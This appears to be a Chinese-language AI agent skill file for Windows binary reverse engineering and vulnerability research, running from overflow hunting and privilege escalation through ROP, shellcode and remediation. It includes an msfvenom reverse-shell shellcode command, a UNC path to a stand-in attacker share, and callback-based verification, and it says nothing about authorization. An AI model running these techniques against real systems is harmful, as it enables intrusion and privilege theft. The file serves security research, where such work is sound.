---
name: windows-reverse-engineering
description: 当目标为 Windows PE 程序（EXE/DLL/SYS/驱动）、.NET 程序、Windows 服务、内核组件，或需要静态/动态逆向分析挖掘缓冲区溢出、远程命令执行、权限提升、信息泄露、拒绝服务等二进制漏洞时调用。负责反汇编/反编译分析、内存破坏漏洞挖掘、协议逆向、反调试对抗、漏洞利用链构造、shellcode 编写与 PoC 验证。
---

# windows-reverse-engineering — Windows 逆向与二进制漏洞专项深度挖掘

## 何时调用（触发条件）

- 拿到 Windows PE 文件（EXE/DLL/SYS）需要逆向分析
- 目标为 Windows 服务/守护进程，需挖掘内存破坏类漏洞
- 程序处理网络/文件/IPC 输入，存在溢出/命令执行面
- 需要 .NET 程序反编译（dnSpy/ILSpy）
- 驱动/内核组件漏洞挖掘（IOCTL、Pool 溢出）
- 协议逆向、加密算法还原
- 需要绕过反调试/反虚拟机/反分析
- 需要构造 PoC/exploit 验证漏洞可利用性

## 一、漏洞类型全景

| 类型 | 危险函数/场景 | 挖掘要点 |
|---|---|---|
| 缓冲区溢出 | strcpy/strcat/sprintf/gets/memcpy/wcscpy | 栈溢出、堆溢出、off-by-one、整型溢出 |
| 远程命令执行 | system/CreateProcess/ShellExecute/WinExec | 命令拼接、UNC路径、COM接口滥用 |
| 权限提升 | 服务路径未引用/UAC绕过/令牌滥用/弱权限 | Unquoted Service Path、DLL劫持、令牌窃取 |
| 信息泄露 | 硬编码凭证/调试输出/内存残留/配置文件 | 字符串扫描、资源段、内存dump |
| 拒绝服务 | 未校验长度/空指针/除零/死循环/资源耗尽 | 输入长度异常、空对象解引用 |

## 二、工具链

### 静态分析
```
反汇编：IDA Pro / Ghidra / Binary Ninja / Radare2
反编译：Hex-Rays / Ghidra Decompiler / RetDec
.NET：  dnSpy / ILSpy / dotPeek
字符串：Strings / FLOSS / BinText
结构：  PEview / CFF Explorer / Detect It Easy (DIE)
扫描：  cppcheck / FlawFinder / Semgrep（带源码时）
YARA：  规则匹配已知漏洞模式/恶意特征
```

### 动态分析
```
调试器：x64dbg/x32dbg / WinDbg / OllyDbg
.NET：  dnSpy 动态调试
Hook：  Frida / API Monitor / Detours
内存：  Cheat Engine / Process Hacker
网络：  Wireshark / mitmproxy / socket replay
模糊测试：AFL++ / WinAFL / boofuzz（协议）/ honggfuzz
流量重放：scapy / 自定义 Python socket
```

### 漏洞利用
```
框架：  pwntools / mona.py (Immunity) / ROPgadget
Shellcode：msfvenom / shellcodecs / 自写
Gadget： ROPgadget / ropper / rp++
计算：  !py mona pattern_create / pattern_offset
```

## 三、静态分析要点

### 1. 信息收集先行
```
文件类型：DIE / TrID 识别编译器/语言/壳
PE结构：  检查 ASLR/DEP/CFG/SafeSEH/SEHOP 保护标志
导入表：  关注危险 API（见下表）
字符串：  提取 URL/IP/路径/密钥/SQL/错误信息
资源段：  嵌入配置/证书/PE/脚本
```

### 2. 危险 API 速查表

| 类别 | 危险 API | 风险 |
|---|---|---|
| 字符串 | strcpy/strcat/sprintf/vsprintf/gets | 栈溢出 |
| 宽字符 | wcscpy/wcscat/swprintf | 栈溢出 |
| 内存 | memcpy/RtlCopyMemory/memmove | 长度可控溢出 |
| 格式化 | printf/sprintf/fprintf/wsprintf | 格式化字符串 |
| 命令 | system/CreateProcess/ShellExecute/WinExec | 命令注入 |
| 文件 | fopen/CreateFile/WriteFile | 路径穿越/任意写 |
| 网络 | recv/WSARecv/ReadFile(pipe) | 网络输入面 |
| 注册表 | RegSetValue/RegCreateKey | 持久化/配置篡改 |
| 加载 | LoadLibrary/GetProcAddress | DLL劫持/注入 |
| 内存 | VirtualAlloc/WriteProcessMemory | 注入面 |

### 3. 控制流与数据流追踪
```
入口点 → WinMain / DllMain / ServiceMain / HandlerRoutine
输入源：命令行 / 配置文件 / 网络 socket / 命名管道 / RPC / COM
关键路径：recv → memcpy / GetCommandLine → sprintf / ReadFile → strcpy
危险Sink：函数指针调用、虚表调用、jmp/call [reg]
```

### 4. .NET 程序专项
```
dnSpy 反编译 → 搜索 Process.Start/SecurityElement/XmlDocument
关注：XmlDocument.Load（XXE）、Process.Start（命令注入）、
     BinaryFormatter/XmlSerializer（反序列化）、
     RegEx（ReDoS）、路径拼接（穿越）
混淆：de4dot 去混淆 → 重新反编译
强命名：检查强名称，评估重打包/篡改可行性
```

## 四、动态分析要点

### 1. 调试基础
```
x64dbg：
  断点：bp <addr> / 条件断点 / 内存断点 / 硬件断点
  追踪：TraceInto/TraceOver → 记录执行流
  内存：内存窗口、堆栈窗口、 watches
WinDbg：
  !analyze -v（崩溃分析）
  !exchain / !dh / !handle
  sxe ld:<module>（模块加载断点）
  ba <size> <addr>（硬件断点）
```

### 2. 输入点 Hook
```
Frida hook 危险函数：
  Interceptor.attach(Module.findExportByName(null, 'memcpy'), {
    onEnter: function(args) {
      console.log('memcpy dst=', args[0], 'src=', args[1], 'len=', args[2].toInt32());
    }
  });
API Monitor：批量监控文件/注册表/网络/进程 API
Procmon：文件+注册表活动追踪
```

### 3. 网络协议逆向
```
1. Wireshark 抓包 → 提取协议字段
2. boofuzz/自定义脚本变异输入
3. 在 recv/WSARecv 下断 → 反推解析逻辑
4. 定位长度字段/魔数/校验 → 构造合规包
5. 在协议解析函数中寻找溢出点
```

## 五、缓冲区溢出专项挖掘

### 1. 栈溢出
```
特征：strcpy/gets/sprintf 无边界检查
验证：
  1. 定位输入到栈缓冲区的拷贝
  2. pattern_create 创建唯一模式
  3. 覆盖 EBP/RET，pattern_offset 计算偏移
  4. 检查可跳转模块（jmp esp / pop reg; ret）
  5. 构造 ROP 绕 DEP（mona rop / ROPgadget）
保护：检查 /GS（cookie）、SafeSEH、CFG
```

### 2. 堆溢出
```
特征：memcpy/HeapAlloc 后越界写
利用：
  Windows XP/2003：UFH/Block List 腐蚀
  Win7+：堆块元数据（_HEAP_ENTRY）腐蚀
  Win10+：Segment Heap，关注 _HEAP_ENTRY_CONTEXT
UAF：释放后引用 → 占位控制 → 虚表劫持
  1. 定位 free → use 的间隔
  2. 在间隔内分配等大内存占位
  3. 覆盖虚表指针 → 跳转可控地址
```

### 3. 整型溢出
```
符号扩展：int → size_t 转换
算术溢出：(a+b) < len 时 a+b 回绕
乘法溢出：a*b 截断
验证：在 memcpy 前断点，观察长度参数
```

### 4. off-by-one
```
循环条件：<= 误写为 < / 循环变量多增 1
wcsncpy 末尾不补 \0 → 后续 strcpy 越界
验证：精确控制输入长度，对比堆栈/堆布局差异
```

## 六、远程命令执行专项

### 1. 命令注入
```
拼接点：system(cmd.c_str()) / CreateProcess(NULL, cmd, ...)
特殊字符：& | ; %PATH% $(cmd) `cmd`
UNC 路径：\\attacker\share 触发 NTLM / SMB
案例：PrintSpooler、后台脚本调用、备份工具
验证：构造命令分隔符 payload → 回连 DNSLog/nc
```

### 2. 反序列化漏洞
```
.NET：
  BinaryFormatter / LosFormatter / ObjectStateFormatter
  JavaScriptSerializer / XmlSerializer（gadget 链）
  工具：ysoserial.net
Java（JVM on Windows）：
  ObjectInputStream + CC链 / JDK7u21
工具：ysoserial
验证：弹 calc.exe / 写文件 / 回连
```

### 3. COM 接口滥用
```
查找：OleView / 注册表 InprocServer32
关注：暴露 IShellDispatch / IWshShell 的对象
  Shell.Application → ShellExecute
验证：脚本调用 ShellExecute 执行任意命令
```

## 七、权限提升专项

### 1. 服务类
```
Unquoted Service Path：
  路径含空格未加引号 → C:\Program Files\My Service\svc.exe
  放置 C:\Program.exe / C:\Program Files\My.exe 劫持
  前提：服务以 SYSTEM 启动，普通用户可写父目录
Weak Service Permissions：
  sc sdshow <svc> → 解析 ACL
  普通用户可修改 binPath → 替换为 payload
  AccessChk: accesschk.exe -uwcqv "Users" *
```

### 2. DLL 劫持
```
查找：Procmon 监控 Name not found 的 DLL 加载
可写目录：PATH 中的用户目录、应用目录
签名绕过：Side-Loading（代理 DLL 转发原函数）
工具：DLL Hijacking Auditor / SharpDLLHijack
```

### 3. UAC 绕过
```
自动提升的 COM 对象（ICMLuaUtil / IColorDataProxy）
 fodhelper.exe / computerdefaults.exe 注册表劫持
环境变量注入：windir / SystemRoot 劫持
Token Manipulation：
  impersonation token窃取（SeImpersonate）
  Potato 家族：RoguePotato / JuicyPotato / PrintSpicePotato
  SeImpersonate → SYSTEM（IIS/SQL Server 服务）
```

### 4. 内核提权
```
驱动 IOCTL：DeviceIoControl → 缓冲区解析漏洞
  IOCTL Heap Overflow / Arbitrary Write
Pool Overflow：非分页池溢出 → 占位token → SYSTEM
任意写：覆盖 HalDispatchTable / token 权限位
工具：HEVD（学习）、IOCTL Picker
```

## 八、信息泄露专项

### 1. 静态泄露
```
硬编码：字符串扫描 Password=/key=/AKID/secret
PDB 路径：泄露开发目录结构/用户名
资源段：嵌入证书/配置/SQL/接口
版本信息：Company/InternalName 暴露厂商
```

### 2. 动态泄露
```
内存残留：进程内存 dump → 搜索 token/密码
调试输出：OutputDebugString / 日志文件
注册表：HKLM\Software\<App> 明文配置
错误信息：崩溃 dump / 异常栈
```

### 3. 协议泄露
```
明文传输：未加密 socket / Telnet / HTTP
调试接口：留有调试命令/隐藏命令字
越权读取：协议字段未校验 → 读取他人数据
```

## 九、拒绝服务专项

```
长度异常：超长输入 → 分配失败 / 越界
空指针：长度字段为0 → 解引用空指针
整型：负数长度 → 巨大分配 → OOM
除零：除数来自输入
死循环：状态机解析错误
资源耗尽：连接不释放 / 文件句柄不关闭
ReDoS：正则回溯（.NET Regex）
解压炸弹：压缩比异常
```

## 十、反调试 / 反虚拟机对抗

### 反调试
```
IsDebuggerPresent / CheckRemoteDebuggerPresent
PEB.BeingDebugged / NtGlobalFlag
时间检测：rdtsc / GetTickCount 差值
硬件断点检测：Dr0-Dr7
异常处理：INT 3 / INT 2D 探测
对抗：
  x64dbg ScyllaHide 插件
  Frida hook 返回 0
  手工 patch 反调试分支
```

### 反虚拟机 / 反沙箱
```
CPUID 指令（hypervisor bit）
注册表：HKLM\HARDWARE\DESCRIPTION\System\BIOS
MAC 地址前缀：00:0C:29 / 00:50:56（VMware）
进程：vmtoolsd.exe / vboxservice.exe
文件路径：C:\Windows\System32\drivers\vmmouse.sys
对抗：patch / hook / 单步执行绕过
```

### 加壳与混淆
```
识别：DIE / PEiD
常见壳：UPX / VMP / Themida / ASPack
脱壳：
  UPX：upx -d
  VMP/Themida：Trace + 重建 IAT（Scylla）
  .NET：de4dot（混淆）/ unvirtual（VM）
定位 OEP：ESP 定律 / 内存断点 / GET EIP
```

## 十一、漏洞利用构造

### 1. 利用链规划
```
1. 漏洞类型：栈/堆/格式化/任意写/逻辑
2. 保护状态：ASLR/DEP/CFG/SafeSEH
3. 可用模块：无 ASLR 模块、可执行内存
4. 利用原语：控制 EIP/RIP、任意写、信息泄露
5. 链路：泄露基址 → 绕 ASLR → ROP → shellcode
```

### 2. ROP 构造
```
工具：ROPgadget --binary x.exe / ropper
绕 DEP：VirtualProtect / VirtualAlloc
链：pop reg; ret → 设置参数 → 调用函数
返回：jmp esp / 跳到 shellcode
```

### 3. Shellcode
```
生成：msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f c
编码：msfvenom -e x86/shikata_ga_nai -i 5
约束：避免坏字符 \x00 \x0a \x0d \xff
存放：.data 段 / 堆 / jitter 到可执行内存
替代：纯 ROP 实现功能（更稳定）
```

## 十二、模糊测试

```
选择：
  文件型：AFL++ + WinAFL（持久化模式）
  协议型：boofuzz（结构化）/ 自定义变异
  内核型：kAFL / IOCTL fuzzer
目标函数：解析复杂结构、处理外部输入的函数
种子：合法样本库（覆盖各分支）
监控：崩溃捕获（WinDbg/gflags）+ 崩溃分类
去重：栈哈希 → 同类合并
```

## 十三、验证要点

- **溢出**：偏移精确、能控制 EIP/RIP、能稳定执行 shellcode
- **RCE**：可回连、可执行任意命令、无字符限制时用 msfvenom
- **提权**：从普通用户 → SYSTEM/管理员，记录权限前后对比
- **信息泄露**：明确泄露数据类型与影响（密钥/账户/源码）
- **DoS**：明确触发条件、最小化复现 payload、评估可恢复性
- **PoC**：包含完整复现脚本与预期输出，附崩溃地址/栈

## 十四、修复建议

- 缓冲区：使用安全函数（strcpy_s/strncpy_s）、开启 /GS /DEP /ASLR /CFG
- 命令执行：避免拼接、参数化传递（CreateProcessW 的 lpApplicationName）
- 反序列化：禁用 BinaryFormatter、使用 DataContractSerializer 白名单
- 提权：服务路径加引号、ACL 限制、最小权限运行、禁用不必要 COM 提权
- 信息泄露：去除硬编码、PDB 不打包、资源加密、关闭调试输出
- DoS：长度校验、空指针检查、超时与连接数限制
- 整体：启用现代编译选项（/guard:cfg /CET /GS /HIGHENTROPYVA）

## 十五、输出与报告要点

- 漏洞类型与 CVSS 评估（AV/AC/PR/UI/S/C/I/A）
- 完整复现步骤：环境 → 输入构造 → 触发 → 结果
- 关键反汇编片段（IDA 截图/文本）标注漏洞点
- PoC 脚本（Python/C）+ 崩溃日志
- 利用链说明：保护绕过、ROP 链、shellcode
- 影响评估：可执行命令/读取数据/提权层级/拒绝服务
- 修复方案：对应章节的具体加固措施
